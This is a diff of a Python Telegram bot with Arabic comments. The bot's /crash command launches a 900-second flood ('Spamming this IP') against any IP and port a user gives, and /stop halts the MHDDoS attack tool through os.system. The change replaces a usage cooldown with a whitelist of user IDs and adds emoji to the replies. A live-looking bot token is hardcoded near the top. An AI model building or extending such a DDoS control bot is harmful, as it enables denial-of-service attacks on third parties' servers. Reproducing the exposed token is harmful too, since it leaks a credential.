@@ -7,7 +7,7 @@ TOKEN = "7684261013:AAGDDOGFZ8Uz2Vlp8CCF_UWr9uLyi5X1ejc"
 bot = telebot.TeleBot(TOKEN)
 
 # قائمة المستخدمين المسموح لهم بدون حد زمني
-ALLOWED_USERS = [1480248962, 1480248962]  # معرفات المستخدمين
+ALLOWED_USERS = [1480248962,7684261013,8068341198]  # ضع هنا معرفات المستخدمين المسموح لهم باستعمال /crash
 
 # قواميس لتتبع آخر وقت تنفيذ الأمر لكل مستخدم
 user_last_used = {}
@@ -20,17 +20,13 @@ def handle_crash_command(message):
 
         # تحقق إذا كان المستخدم في القائمة المسموحة
         if user_id not in ALLOWED_USERS:
-            # إذا المستخدم ليس في القائمة، تحقق من الوقت المنقضي
-            if user_id in user_last_used:
-                last_used = user_last_used[user_id]
-                time_passed = current_time - last_used
-                if time_passed < 2 * 60 * 60:  # ساعتين بالثواني
-                    remaining_time = int((2 * 60 * 60 - time_passed) / 60)
-                    bot.reply_to(
-                        message, 
-                        f"لا يمكنك استخدام هذا الأمر الآن. حاول مجددًا بعد {remaining_time} دقيقة."
-                    )
-                    return
+            bot.reply_to(
+                message,
+                f"🚫 *عذرًا، ليس لديك صلاحيات لاستخدام هذا الأمر!* 🚫\n\n"
+                f"⚠️ _إذا كنت تعتقد أن هذا خطأ، يرجى التواصل مع مسؤول البوت._",
+                parse_mode="Markdown"
+            )
+            return
 
         # تحديث وقت آخر استخدام
         user_last_used[user_id] = current_time
@@ -54,7 +50,7 @@ def handle_crash_command(message):
             return
 
         # الرد على المستخدم
-        response = f"Spamming this IP ===> {ip}:{port} for 900 seconds"
+        response = f"🚀 Spamming this IP ===> {ip}:{port} for 900 seconds 🚀"
         bot.reply_to(message, response)
 
         # تحضير الأمر باش يشغل الكود
@@ -70,17 +66,22 @@ def handle_stop_command(message):
 
         # تحقق إذا المستخدم مسموح له باستخدام الأمر
         if user_id not in ALLOWED_USERS:
-            bot.reply_to(message, "ليس لديك الإذن لاستخدام هذا الأمر.")
+            bot.reply_to(
+                message,
+                f"🚫 *عذرًا، ليس لديك صلاحيات لاستخدام هذا الأمر!* 🚫\n\n"
+                f"⚠️ _إذا كنت تعتقد أن هذا خطأ، يرجى التواصل مع مسؤول البوت._",
+                parse_mode="Markdown"
+            )
             return
 
         # الرد على المستخدم
-        bot.reply_to(message, "جاري إيقاف جميع العمليات...")
+        bot.reply_to(message, "⏹️ جاري إيقاف جميع العمليات...")
 
         # تنفيذ أمر الإيقاف
         os.system("python3 /workspaces/MHDDoS/start.py stop")
 
         # تأكيد الإيقاف
-        bot.reply_to(message, "تم إيقاف العمليات بنجاح!")
+        bot.reply_to(message, "✅ تم إيقاف العمليات بنجاح!")
     except Exception as e:
         bot.reply_to(message, f"صارت مشكلة: {str(e)}")
 
